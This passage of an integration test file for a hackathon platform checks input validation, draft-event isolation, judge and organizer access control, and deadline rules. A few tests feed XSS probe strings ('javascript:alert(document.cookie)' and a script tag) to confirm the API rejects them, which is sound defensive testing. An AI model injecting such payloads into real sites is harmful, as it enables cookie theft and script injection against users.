        website: "javascript:alert(document.cookie)",
      },
    });
    assert.equal(badUrlRes.status, 400);
    assert.match(badUrlRes.data?.error, /URLs must start with http:\/\/ or https:\/\//i);

    // 2. Successfully create user with valid https:// URL
    const goodEmail = `valid_admin_user_${Date.now()}@example.com`;
    const goodRes = await api("/api/admin/users", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        name: "Legit Dev User",
        email: goodEmail,
        website: "https://legit-builder.dev",
      },
    });
    assert.equal(goodRes.status, 201);
    assert.equal(goodRes.data?.user?.email, goodEmail);

    // Clean up created user
    await sql`DELETE FROM public.users WHERE email = ${goodEmail};`;
    await sql`DELETE FROM neon_auth.user WHERE email = ${goodEmail};`;
  });

  test("2.3. Unvalidated participation_type string injection in registration", async () => {
    // 1. Attempt to register with script injection in participation_type
    const xssRegRes = await api(`/api/hackathons/${robustHackathonSlugA}/register`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        participation_type: "<script>alert(1)</script>",
      },
    });
    assert.equal(xssRegRes.status, 400);
    assert.match(xssRegRes.data?.error, /Invalid participation type/i);

    // 2. Register with valid participation_type "solo"
    const validRegRes = await api(`/api/hackathons/${robustHackathonSlugA}/register`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        participation_type: "solo",
      },
    });
    assert.equal(validRegRes.status, 200);
    assert.equal(validRegRes.data?.participation_type, "solo");
  });

  test("4.1. Unhandled slug collision in updateHackathon disambiguates without 500 crash", async () => {
    // Update Hackathon B with Hackathon A's exact slug
    const updateRes = await api(`/api/admin/hackathons/${robustHackathonIdB}`, {
      method: "PATCH",
      token: ADMIN_TOKEN,
      body: {
        slug: robustHackathonSlugA,
      },
    });

    assert.equal(updateRes.status, 200, "Must return 200 rather than crashing with 500");
    assert.ok(updateRes.data?.hackathon?.slug);
    // Verified that slug was disambiguated and not identical to Hackathon A's slug
    assert.notEqual(updateRes.data.hackathon.slug, robustHackathonSlugA);
    assert.ok(updateRes.data.hackathon.slug.startsWith(robustHackathonSlugA));
  });

  test("4.2. Unregistered user cannot dispatch ghost team invitations (POST /api/team-invites)", async () => {
    const inviteeEmail = `invitee_target_${Date.now()}@example.com`;

    // 1. Rival (NOT registered for Ghost Invite Challenge) attempts to send team invite
    const ghostRes = await api("/api/team-invites", {
      method: "POST",
      token: RIVAL_TOKEN,
      body: {
        hackathon_id: ghostHackathonId,
        receiver_email: inviteeEmail,
        team_name: "Ghost Squad",
      },
    });

    assert.equal(ghostRes.status, 400);
    assert.match(ghostRes.data?.error, /You must register for this hackathon before sending team invitations/i);

    // 2. Rival registers for the hackathon
    const regRes = await api(`/api/hackathons/${ghostHackathonSlug}/register`, {
      method: "POST",
      token: RIVAL_TOKEN,
      body: {
        participation_type: "looking_for_team",
      },
    });
    assert.equal(regRes.status, 200);

    // 3. Rival now retries sending team invite -> succeeds
    const legitInviteRes = await api("/api/team-invites", {
      method: "POST",
      token: RIVAL_TOKEN,
      body: {
        hackathon_id: ghostHackathonId,
        receiver_email: inviteeEmail,
        team_name: "Legit Squad",
      },
    });
    assert.equal(legitInviteRes.status, 200);
    assert.equal(legitInviteRes.data?.success, true);
  });
});

describe("Suite T: Draft Hackathon Isolation & Public Leakage Prevention", () => {
  let draftHackathonId = "";
  let draftHackathonSlug = "";
  let draftTitle = "";
  let draftTag = "";
  let draftSubmissionId = "";

  before(async () => {
    const timestamp = Date.now();
    draftTitle = `Top Secret Draft Arena ${timestamp}`;
    draftTag = `DraftTag${timestamp}`;

    // 1. Create a draft hackathon via Admin API
    const res = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: draftTitle,
        tagline: "Unreleased stealth challenge for upcoming season",
        description: "Full secret roadmap and requirements for internal staff only.",
        status: "draft",
        format: "virtual",
        start_date: new Date(Date.now() + 86400000).toISOString(),
        end_date: new Date(Date.now() + 86400000 * 7).toISOString(),
        tags: [draftTag, "SecretAI"],
        website_url: "https://example.com/stealth",
        banner_url: "https://example.com/banner.png",
        thumbnail_url: "https://example.com/thumb.png",
        prizes: [{ rank: 1, title: "Grand Prize", amount: 50000 }],
      },
    });

    assert.equal(res.status, 201, `Failed to create draft hackathon: ${JSON.stringify(res.data)}`);
    assert.ok(res.data?.hackathon?.id);
    draftHackathonId = res.data.hackathon.id;
    draftHackathonSlug = res.data.hackathon.slug;

    // 2. Insert a test submission under this draft hackathon directly as admin for testing project isolation
    const subId = crypto.randomUUID();
    await sql`
      INSERT INTO public.hackathon_submissions (
        id, hackathon_id, user_id, title, tagline, description, demo_url, github_url,
        tech_stack, screenshots, is_featured, status, winner_badge, created_at, updated_at
      ) VALUES (
        ${subId}::uuid, ${draftHackathonId}::uuid, ${adminId}::uuid,
        'Stealth Project Alpha', 'A secret hackathon project', 'Confidential prototype',
        'https://demo.example.com', 'https://github.com/example/stealth',
        ARRAY['Rust', 'Wasm'], ARRAY[]::text[], true, 'approved', 'Grand Prize', NOW(), NOW()
      );
    `;
    draftSubmissionId = subId;
  });

  test("T.1. Draft hackathon is completely hidden from public landing page (GET /)", async () => {
    const home = await fetchHtml("/");
    assert.equal(home.status, 200);
    assert.ok(!home.text.includes(draftTitle), "Draft hackathon title must NOT be rendered on public home page");
    assert.ok(!home.text.includes(draftHackathonSlug), "Draft hackathon slug must NOT appear in home page links");
  });

  test("T.2. Draft hackathon is completely hidden from public directory and tag filters (GET /hackathons)", async () => {
    const publicDirectory = await fetchHtml("/hackathons");
    assert.equal(publicDirectory.status, 200);
    assert.ok(!publicDirectory.text.includes(draftTitle), "Draft hackathon title must NOT appear in public hackathons list");
    assert.ok(!publicDirectory.text.includes(draftTag), "Draft hackathon tags must NOT leak into public filter tags");

    // Even if non-admin tries to query ?status=draft
    const sneakyQuery = await fetchHtml("/hackathons?status=draft");
    assert.equal(sneakyQuery.status, 200);
    assert.ok(!sneakyQuery.text.includes(draftTitle), "Sneaky ?status=draft must not leak draft hackathons to public");
  });

  test("T.3. Draft hackathon and its submissions are excluded from sitemap.xml", async () => {
    const sitemap = await fetchHtml("/sitemap.xml");
    assert.equal(sitemap.status, 200);
    assert.ok(!sitemap.text.includes(`/hackathons/${draftHackathonSlug}`), "Draft hackathon URL must NOT appear in sitemap.xml");
    assert.ok(!sitemap.text.includes(`/projects/${draftSubmissionId}`), "Draft hackathon project URL must NOT appear in sitemap.xml");
  });

  test("T.4. Non-admin visitors get 404 on draft hackathon page (GET /hackathons/[slug])", async () => {
    // 1. Anonymous visitor
    const anonRes = await fetchHtml(`/hackathons/${draftHackathonSlug}`);
    assert.equal(anonRes.status, 404, "Anonymous visitor must receive 404 for draft hackathon");

    // 2. Logged-in non-admin builder
    const builderRes = await fetchHtml(`/hackathons/${draftHackathonSlug}`, BUILDER_TOKEN);
    assert.equal(builderRes.status, 404, "Logged-in regular user must receive 404 for draft hackathon");

    // 3. Admin CAN view the draft hackathon preview
    const adminRes = await fetchHtml(`/hackathons/${draftHackathonSlug}`, ADMIN_TOKEN);
    assert.equal(adminRes.status, 200, "Admin must be able to preview draft hackathon");
    assert.ok(adminRes.text.includes(draftTitle));
  });

  test("T.5. Non-admin registration to draft hackathon is blocked with 404 (POST /api/hackathons/[slug]/register)", async () => {
    const regRes = await api(`/api/hackathons/${draftHackathonSlug}/register`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        participation_type: "solo",
      },
    });
    assert.equal(regRes.status, 404, "Registration to draft hackathon must return 404");

    const getRegRes = await api(`/api/hackathons/${draftHackathonSlug}/register`, {
      token: BUILDER_TOKEN,
    });
    assert.equal(getRegRes.status, 404, "Registration check for draft hackathon must return 404");
  });

  test("T.6. Non-admin project submission to draft hackathon is blocked with 404 (POST /api/hackathons/[slug]/submissions)", async () => {
    // 1. Submit page returns 404
    const submitPage = await fetchHtml(`/hackathons/${draftHackathonSlug}/submit`, BUILDER_TOKEN);
    assert.equal(submitPage.status, 404, "Submit page for draft hackathon must return 404");

    // 2. Submission POST API returns 404
    const subRes = await api(`/api/hackathons/${draftHackathonSlug}/submissions`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        title: "Unauthorized Hack",
        tagline: "Trying to submit to draft",
        description: "Should fail immediately with 404",
      },
    });
    assert.equal(subRes.status, 404, "Submitting to draft hackathon must return 404");

    // 3. Submissions GET API returns 404
    const listRes = await api(`/api/hackathons/${draftHackathonSlug}/submissions`, {
      token: BUILDER_TOKEN,
    });
    assert.equal(listRes.status, 404, "Listing submissions of draft hackathon must return 404");
  });

  test("T.7. Team invites for draft hackathons are rejected with 404 (POST /api/team-invites)", async () => {
    const inviteRes = await api("/api/team-invites", {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        hackathon_id: draftHackathonId,
        receiver_email: "someone@example.com",
        team_name: "Sneaky Inviter",
      },
    });
    assert.equal(inviteRes.status, 404, "Dispatching team invites for draft hackathon must return 404");
  });

  test("T.8. Project detail page for draft hackathon submission returns 404 for non-admins", async () => {
    // 1. Anonymous visitor
    const anonRes = await fetchHtml(`/projects/${draftSubmissionId}`);
    assert.equal(anonRes.status, 404, "Project under draft hackathon must return 404 to anonymous users");

    // 2. Regular logged-in builder
    const builderRes = await fetchHtml(`/projects/${draftSubmissionId}`, BUILDER_TOKEN);
    assert.equal(builderRes.status, 404, "Project under draft hackathon must return 404 to non-admins");

    // 3. Admin can inspect the project
    const adminRes = await fetchHtml(`/projects/${draftSubmissionId}`, ADMIN_TOKEN);
    assert.equal(adminRes.status, 200, "Admin must be able to view draft hackathon project");
  });

  test("T.9. Admin console maintains full visibility over draft hackathons", async () => {
    const adminHackathons = await api("/api/admin/hackathons", {
      token: ADMIN_TOKEN,
    });
    assert.equal(adminHackathons.status, 200);
    const found = adminHackathons.data?.hackathons?.some((h: any) => h.id === draftHackathonId);
    assert.ok(found, "Admin must see draft hackathons in the admin hackathon management list");
  });
});

describe("Suite U: Judge & Organizer RBAC Access & Portal Routing", () => {
  test("U.1. Judge role CAN access /admin/judging (HTTP 200)", async () => {
    const res = await fetchHtml("/admin/judging", JUDGE_TOKEN);
    assert.equal(res.status, 200, "Judge must be granted access to /admin/judging");
    assert.ok(
      res.text.includes("Judging &amp; Scoring Portal") || res.text.includes("Judging & Scoring Portal"),
      "Response must render the judging interface"
    );
    assert.ok(!res.text.includes("Access Restricted"), "Judge must not see Access Restricted screen");
  });

  test("U.2. Regular user (builder) CANNOT access /admin/judging", async () => {
    const res = await fetchHtml("/admin/judging", BUILDER_TOKEN);
    assert.ok(
      res.text.includes("Access Restricted") || res.status === 307,
      "Regular user must be blocked from /admin/judging"
    );
  });

  test("U.3. Anonymous visitor accessing /admin/judging is redirected to sign-in", async () => {
    const res = await fetch(`${BASE_URL}/admin/judging`, { redirect: "manual" });
    assert.equal(res.status, 307, "Anonymous visitor must receive 307 redirect");
    const location = res.headers.get("location");
    assert.ok(location?.includes("/auth/signin"), "Redirect location must point to sign-in page");
  });

  test("U.4. Judge navigating to /admin is redirected to /admin/judging", async () => {
    const res = await fetch(`${BASE_URL}/admin`, {
      headers: { Cookie: `neon-auth.session_token=${JUDGE_TOKEN}` },
      redirect: "manual",
    });
    assert.equal(res.status, 307, "Judge accessing /admin must be redirected to /admin/judging");
    const location = res.headers.get("location");
    assert.ok(location?.includes("/admin/judging"), "Redirect location must be /admin/judging");
  });

  test("U.5. UserMenu renders Judging & Scoring Portal link for judge", async () => {
    const res = await fetchHtml("/profile", JUDGE_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("/admin/judging"),
      "UserMenu for judge must contain link to /admin/judging"
    );
    assert.ok(
      res.text.includes("Judging Portal") || res.text.includes("Judging &amp; Scoring Portal") || res.text.includes("Judging & Scoring Portal"),
      "UserMenu must display Judging & Scoring Portal link text"
    );
  });

  test("U.6. UserMenu renders Judging & Scoring Portal link for admin", async () => {
    const res = await fetchHtml("/profile", ADMIN_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("/admin/judging"),
      "UserMenu for admin must contain link to /admin/judging"
    );
    assert.ok(
      res.text.includes("/admin"),
      "UserMenu for admin must also contain link to /admin console"
    );
  });

  test("U.7. UserMenu for regular builder does NOT display Judging or Admin links", async () => {
    const res = await fetchHtml("/profile", BUILDER_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      !res.text.includes("/admin/judging"),
      "UserMenu for regular builder must not contain link to /admin/judging"
    );
  });
});

describe("Suite V: Hackathon Browse Track & Tag Parameter Parity", () => {
  test("V.1. GET /hackathons?track=ai filters for AI competitions", async () => {
    const res = await fetchHtml("/hackathons?track=ai");
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Autonomous Sprint") || res.text.includes("AI Agents") || res.text.includes("ahackathon"),
      "Track=ai must include AI competitions"
    );
  });

  test("V.2. GET /hackathons?tag=ai and GET /hackathons?track=ai achieve filter parity", async () => {
    const tagRes = await fetchHtml("/hackathons?tag=ai");
    const trackRes = await fetchHtml("/hackathons?track=ai");
    assert.equal(tagRes.status, 200);
    assert.equal(trackRes.status, 200);
    assert.ok(tagRes.text.includes("Autonomous Sprint") || tagRes.text.includes("AI Agents"));
    assert.ok(trackRes.text.includes("Autonomous Sprint") || trackRes.text.includes("AI Agents"));
  });

  test("V.3. GET /hackathons?track=mobile isolates mobile competition from non-mobile sprint", async () => {
    const res = await fetchHtml("/hackathons?track=mobile");
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("NextGen Mobile &amp; Spatial") || res.text.includes("NextGen Mobile & Spatial"),
      "Track=mobile must include Mobile competitions"
    );
    assert.ok(
      !res.text.includes("Global NextGen Autonomous Sprint 2026"),
      "Track=mobile must exclude non-mobile AI sprints"
    );
  });

  test("V.4. GET /hackathons?track=devtools filters for devtools competitions", async () => {
    const res = await fetchHtml("/hackathons?track=devtools");
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Global AI Agents Sprint 2026"),
      "Track=devtools must include DevTools hackathon"
    );
    assert.ok(
      !res.text.includes("NextGen Mobile &amp; Spatial") && !res.text.includes("NextGen Mobile & Spatial"),
      "Track=devtools must exclude Mobile-only competitions"
    );
  });
});

describe("Suite W: Global Projects Showcase Directory (/projects)", () => {
  test("W.1. GET /projects returns HTTP 200 with directory layout and winner badges", async () => {
    const res = await fetchHtml("/projects");
    assert.equal(res.status, 200, "Projects showcase must return HTTP 200");
    assert.ok(
      res.text.includes("World-Class Builds") || res.text.includes("Project Directory"),
      "Must render global projects showcase headline"
    );
    assert.ok(
      res.text.includes("DevPulse Sentinel") || res.text.includes("AgentCraft"),
      "Must render published project cards"
    );
  });

  test("W.2. GET /projects isolates draft hackathon projects from anonymous visitors", async () => {
    const res = await fetchHtml("/projects");
    assert.equal(res.status, 200);
    assert.ok(
      !res.text.includes("Stealth Project Alpha"),
      "Draft hackathon submissions must be hidden from anonymous visitors"
    );
  });

  test("W.3. GET /projects?search=DevPulse filters projects by keyword in rendered cards", async () => {
    const res = await fetchHtml("/projects?search=DevPulse");
    assert.equal(res.status, 200);
    const mainHtml = res.text.slice(res.text.indexOf("<main"), res.text.indexOf("</main>"));
    assert.ok(mainHtml.includes("DevPulse Sentinel"), "Must contain searched project");
    assert.ok(!mainHtml.includes("AgentCraft"), "Must exclude non-matching project");
  });

  test("W.4. GET /projects?tech=Rust filters projects by tech stack in rendered cards", async () => {
    const res = await fetchHtml("/projects?tech=Rust");
    assert.equal(res.status, 200);
    const mainHtml = res.text.slice(res.text.indexOf("<main"), res.text.indexOf("</main>"));
    assert.ok(mainHtml.includes("HyperQuery"), "Must include Rust project");
    assert.ok(!mainHtml.includes("DevPulse Sentinel"), "Must exclude non-Rust project");
  });

  test("W.5. GET /projects?filter=winners filters for winner badge projects in rendered cards", async () => {
    const res = await fetchHtml("/projects?filter=winners");
    assert.equal(res.status, 200);
    const mainHtml = res.text.slice(res.text.indexOf("<main"), res.text.indexOf("</main>"));
    assert.ok(mainHtml.includes("DevPulse Sentinel"), "Must include winner project");
    assert.ok(!mainHtml.includes("VoicePilot 360"), "Must exclude non-winner project");
  });

  test("W.6. GET /sitemap.xml contains /projects URL", async () => {
    const res = await fetch(`${BASE_URL}/sitemap.xml`);
    assert.equal(res.status, 200);
    const text = await res.text();
    assert.ok(text.includes("/projects"), "Sitemap must index /projects showcase URL");
  });
});

describe("Suite X: Submission Deadline Validation Rules", () => {
  const baseStart = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString();
  const baseEnd = new Date(Date.now() + 14 * 24 * 60 * 60 * 1000).toISOString();
  let createdHackathonId: string | null = null;

  test("X.1. POST /api/admin/hackathons rejects deadline earlier than start date (400)", async () => {
    const earlyDeadline = new Date(Date.now() + 3 * 24 * 60 * 60 * 1000).toISOString();
    const res = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: `Validation Test Early Deadline ${Date.now()}`,
        tagline: "Testing submission deadline earlier than start",
        description: "Full description for validation test case with at least twenty characters.",
        start_date: baseStart,
        end_date: baseEnd,
        submission_deadline: earlyDeadline,
        format: "online",
        location: "Virtual",
        max_team_size: 4,
      },
    });

    assert.equal(res.status, 400, "Must reject deadline earlier than start date");
    assert.ok(
      res.data?.error?.includes("Deadline cannot be earlier than the start date") ||
        res.data?.error?.includes("earlier than the start date"),
      "Error message must specify deadline cannot be earlier than start date"
    );
  });

  test("X.2. POST /api/admin/hackathons rejects deadline later than end date (400)", async () => {
    const lateDeadline = new Date(Date.now() + 20 * 24 * 60 * 60 * 1000).toISOString();
    const res = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: `Validation Test Late Deadline ${Date.now()}`,
        tagline: "Testing submission deadline later than end",
        description: "Full description for validation test case with at least twenty characters.",
        start_date: baseStart,
        end_date: baseEnd,
        submission_deadline: lateDeadline,
        format: "online",
        location: "Virtual",
        max_team_size: 4,
      },
    });

    assert.equal(res.status, 400, "Must reject deadline later than end date");
    assert.ok(
      res.data?.error?.includes("cannot be later than the hackathon end date"),
      "Error message must specify deadline cannot be later than end date"
    );
  });

  test("X.3. POST /api/admin/hackathons succeeds when deadline is valid between start and end", async () => {
    const validDeadline = new Date(Date.now() + 10 * 24 * 60 * 60 * 1000).toISOString();
    const res = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: `Validation Test Valid Deadline ${Date.now()}`,
        tagline: "Testing valid submission deadline",
        description: "Full description for validation test case with at least twenty characters.",
        start_date: baseStart,
        end_date: baseEnd,
        submission_deadline: validDeadline,
        format: "online",
        location: "Virtual",
        max_team_size: 4,
      },
    });

    assert.equal(res.status, 201, "Must accept valid deadline");
    assert.ok(res.data?.hackathon?.id, "Hackathon must be created");
    createdHackathonId = res.data.hackathon.id;
  });

  test("X.4. PATCH /api/admin/hackathons/[id] rejects updating deadline earlier than start date (400)", async () => {
    assert.ok(createdHackathonId, "Hackathon must exist for PATCH test");
    const earlyDeadline = new Date(Date.now() + 2 * 24 * 60 * 60 * 1000).toISOString();
    const res = await api(`/api/admin/hackathons/${createdHackathonId}`, {
      method: "PATCH",
      token: ADMIN_TOKEN,
      body: {
        submission_deadline: earlyDeadline,
      },
    });

    assert.equal(res.status, 400, "Must reject deadline earlier than start date in PATCH");
    assert.ok(
      res.data?.error?.includes("Deadline cannot be earlier than the start date"),
      "Error message must specify deadline cannot be earlier than start date"
    );

    // Clean up created test hackathon
    await sql`DELETE FROM public.hackathons WHERE id = ${createdHackathonId}::uuid`;
  });
});

describe("Suite Y: Project Edit Submission Lock on Deadline Expiry", () => {
  let lockHackathonId: string | null = null;
  let lockHackathonSlug: string | null = null;
  let lockSubId: string | null = null;

  before(async () => {
    // 1. Create an active hackathon with future deadline
    const createRes = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: `Lock Test Arena ${Date.now()}`,
        tagline: "Testing edit button vs locked badge",
        description: "Comprehensive description for testing deadline lock badge on project details.",
        status: "active",
        max_team_size: 4,
        start_date: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(),
        end_date: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
        submission_deadline: new Date(Date.now() + 5 * 24 * 60 * 60 * 1000).toISOString(),
      },
    });

    assert.equal(createRes.status, 201);
    lockHackathonId = createRes.data.hackathon.id;
    lockHackathonSlug = createRes.data.hackathon.slug;

    // 2. Register builder
    await api(`/api/hackathons/${lockHackathonSlug}/register`, {
      method: "POST",
      token: BUILDER_TOKEN,
    });

    // 3. Builder submits project
    const subRes = await api(`/api/hackathons/${lockHackathonSlug}/submissions`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        title: "Lock Test Project",
        description: "Initial submission for lock testing",
      },
    });

    assert.equal(subRes.status, 200);
    lockSubId = subRes.data.submission.id;
  });

  after(async () => {
    if (lockHackathonId) {
      await sql`DELETE FROM public.hackathon_submissions WHERE hackathon_id = ${lockHackathonId}::uuid;`;
      await sql`DELETE FROM public.hackathon_registrations WHERE hackathon_id = ${lockHackathonId}::uuid;`;
      await sql`DELETE FROM public.hackathons WHERE id = ${lockHackathonId}::uuid;`;
    }
  });

  test("Y.1. Author viewing project before deadline sees active Edit Submission button", async () => {
    const res = await fetchHtml(`/projects/${lockSubId}`, BUILDER_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Edit Submission"),
      "Active hackathon author must see Edit Submission button"
    );
    assert.ok(
      !res.text.includes("Submissions Locked"),
      "Active hackathon author must not see Submissions Locked badge"
    );
  });

  test("Y.2. Author viewing project after deadline sees Submissions Locked (Deadline Passed)", async () => {
    // Fast forward deadline into past
    const pastDeadline = new Date(Date.now() - 60 * 60 * 1000).toISOString();
    await sql`
      UPDATE public.hackathons
      SET submission_deadline = ${pastDeadline}
      WHERE id = ${lockHackathonId}::uuid;
    `;

    const res = await fetchHtml(`/projects/${lockSubId}`, BUILDER_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Submissions Locked (Deadline Passed)"),
      "Must display Submissions Locked (Deadline Passed) badge"
    );
    assert.ok(
      !res.text.includes("Edit Submission"),
      "Must NOT display active Edit Submission button when deadline has passed"
    );
  });

  test("Y.3. Unrelated viewer (non-author) sees neither Edit Submission nor author lock badge", async () => {
    const res = await fetchHtml(`/projects/${lockSubId}`, RIVAL_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      !res.text.includes("Edit Submission"),
      "Unrelated user must not see Edit Submission button"
    );
    assert.ok(
      !res.text.includes("Submissions Locked (Deadline Passed)"),
      "Unrelated user must not see author's lock badge"
    );
  });
});

describe("Suite Z: Host a Hackathon Onboarding & Inquiry Flow", () => {
  test("Z.1. Landing page for non-admin visitor links 'Host a Hackathon' to /host", async () => {
    const res = await fetchHtml("/", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes('href="/host"'),
      "Landing page for anonymous visitor must link 'Host a Hackathon' to /host"
    );
  });

  test("Z.2. Landing page for admin user links 'Host a Hackathon' to /admin/hackathons/new", async () => {
    const res = await fetchHtml("/", ADMIN_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes('href="/admin/hackathons/new"'),
      "Landing page for admin must link 'Host a Hackathon' directly to admin creation screen"
    );
  });

  test("Z.3. Dedicated onboarding page GET /host returns HTTP 200 with inquiry layout", async () => {
    const res = await fetchHtml("/host", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Host Your High-Impact Hackathon") || res.text.includes("Host a Hackathon"),
      "Must render host hero headline"
    );
    assert.ok(
      res.text.includes("Tell Us About Your Competition"),
      "Must render organizer inquiry form"
    );
  });

  test("Z.4. POST /api/host/inquiry validates required fields (400)", async () => {
    const res = await api("/api/host/inquiry", {
      method: "POST",
      headers: { "x-forwarded-for": `198.51.100.${Math.floor(Math.random() * 200) + 1}` },
      body: {
        organizationName: "",
        contactName: "",
        email: "invalid-email",
        eventGoals: "short",
      },
    });

    assert.equal(res.status, 400);
    assert.ok(res.data?.error, "Must return error message for missing fields");
  });

  test("Z.5. POST /api/host/inquiry accepts valid inquiry with HTTP 200", async () => {
    const res = await api("/api/host/inquiry", {
      method: "POST",
      headers: { "x-forwarded-for": `198.51.100.${Math.floor(Math.random() * 200) + 1}` },
      body: {
        organizationName: "Global AI DevRel",
        contactName: "Alex Rivera",
        email: "alex@global-ai.io",
        timeline: "Q2 2027",
        estimatedPrizePool: "$50,000 - $100,000",
        tracks: ["AI & Autonomous Agents", "Next-Gen DevTools"],
        eventGoals: "Host a global hackathon to accelerate enterprise adoption of our new reasoning APIs.",
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.success, true);
    assert.ok(
      res.data?.message?.includes("Thank you for your interest"),
      "Must return success confirmation message"
    );
  });

  test("Z.6. Footer 'Host a Competition' links to /host", async () => {
    const res = await fetchHtml("/", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes('href="/host"') && res.text.includes("Host a Competition"),
      "Footer must link 'Host a Competition' to /host"
    );
  });

  test("Z.7. Sitemap includes /host route", async () => {
    const res = await fetch(`${BASE_URL}/sitemap.xml`);
    assert.equal(res.status, 200);
    const text = await res.text();
    assert.ok(text.includes("/host"), "Sitemap must index /host route");
  });
});

describe("Suite AA: Public User Profile Empty States & Friendly Visitor CTA (Change 3)", () => {
  before(async () => {
    await sql`UPDATE public.users SET username = ${'rival_empty_' + Date.now()} WHERE id = ${rivalId}`;
  });

  test("AA.1. Visitor viewing empty public profile sees 'Explore Live Challenges' CTA linking to /hackathons", async () => {
    const res = await fetchHtml(`/users/${rivalId}`, null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("No projects published yet"),
      "Must display 'No projects published yet' empty state"
    );
    assert.ok(
      res.text.includes("Explore Live Challenges"),
      "Must render friendly 'Explore Live Challenges' CTA button for visitors"
    );
    assert.ok(
      res.text.includes('href="/hackathons"'),
      "CTA button must link to /hackathons"
    );
    assert.ok(
      !res.text.includes("Explore Active Hackathons"),
      "Visitor must not see owner-only 'Explore Active Hackathons' CTA"
    );
  });

  test("AA.2. Visitor viewing empty hackathons tab sees 'Explore Live Challenges' CTA", async () => {
    const res = await fetchHtml(`/users/${rivalId}?tab=hackathons`, null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("No hackathons joined yet"),
      "Must display 'No hackathons joined yet' empty state"
    );
    assert.ok(
      res.text.includes("Explore Live Challenges"),
      "Must render friendly 'Explore Live Challenges' CTA button for visitors"
    );
    assert.ok(
      res.text.includes('href="/hackathons"'),
      "CTA button must link to /hackathons"
    );
    assert.ok(
      !res.text.includes("Browse Hackathons"),
      "Visitor must not see owner-only 'Browse Hackathons' CTA"
    );
  });

  test("AA.3. Profile owner viewing own empty profile (/profile) sees owner CTA 'Explore Active Hackathons'", async () => {
    const res = await fetchHtml("/profile", RIVAL_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("No projects published yet"),
      "Owner must see 'No projects published yet' empty state"
    );
    assert.ok(
      res.text.includes("Explore Active Hackathons"),
      "Owner must see 'Explore Active Hackathons' CTA"
    );
    assert.ok(
      !res.text.includes("Explore Live Challenges"),
      "Owner must not see visitor CTA 'Explore Live Challenges'"
    );
  });

  test("AA.4. Profile owner viewing own empty hackathons tab sees owner CTA 'Browse Hackathons'", async () => {
    const res = await fetchHtml("/profile?tab=hackathons", RIVAL_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("No hackathons joined yet"),
      "Owner must see 'No hackathons joined yet' empty state"
    );
    assert.ok(
      res.text.includes("Browse Hackathons"),
      "Owner must see 'Browse Hackathons' CTA"
    );
    assert.ok(
      !res.text.includes("Explore Live Challenges"),
      "Owner must not see visitor CTA 'Explore Live Challenges'"
    );
  });
});

describe("Suite AB: Organizer Admin RBAC Authorization & Scoped Access (Change 2)", () => {
  let organizerHackathonId: string | null = null;

  test("AB.1. Organizer role CAN access /admin/hackathons (HTTP 200)", async () => {
    const res = await fetchHtml("/admin/hackathons", ORGANIZER_TOKEN);
    assert.equal(res.status, 200, "Organizer must access /admin/hackathons");
    assert.ok(
      res.text.includes("Hackathons Management"),
      "Must render Hackathons Management portal"
    );
    assert.ok(!res.text.includes("Access Restricted"), "Organizer must not see Access Restricted screen");
  });

  test("AB.2. Organizer role CAN access /admin/hackathons/new (HTTP 200)", async () => {
    const res = await fetchHtml("/admin/hackathons/new", ORGANIZER_TOKEN);
    assert.equal(res.status, 200, "Organizer must access /admin/hackathons/new");
    assert.ok(
      res.text.includes("Create New Hackathon"),
      "Must render Create New Hackathon screen"
    );
    assert.ok(!res.text.includes("Access Restricted"), "Organizer must not see Access Restricted screen");
  });

  test("AB.3. Organizer role CAN create a hackathon via POST /api/admin/hackathons (HTTP 201)", async () => {
    const start = new Date(Date.now() + 86400 * 2 * 1000).toISOString();
    const end = new Date(Date.now() + 86400 * 10 * 1000).toISOString();
    const deadline = new Date(Date.now() + 86400 * 8 * 1000).toISOString();

    const res = await api("/api/admin/hackathons", {
      method: "POST",
      token: ORGANIZER_TOKEN,
      body: {
        title: `Organizer Managed Arena ${Date.now()}`,
        tagline: "Created directly by authorized organizer role",
        description: "Comprehensive multi-track hackathon challenge hosted on Hack4Win.",
        start_date: start,
        end_date: end,
        submission_deadline: deadline,
        currency: "USD",
        status: "published",
        organizer_name: "Global Event Host",
        max_team_size: 4,
      },
    });

    assert.equal(res.status, 201, "Organizer must be authorized to create hackathon");
    assert.ok(res.data?.hackathon?.id, "Hackathon must be returned with ID");
    organizerHackathonId = res.data.hackathon.id;
  });

  test("AB.4. Organizer role CAN update their hackathon via PATCH /api/admin/hackathons/[id] (HTTP 200)", async () => {
    assert.ok(organizerHackathonId, "Hackathon must exist for PATCH");
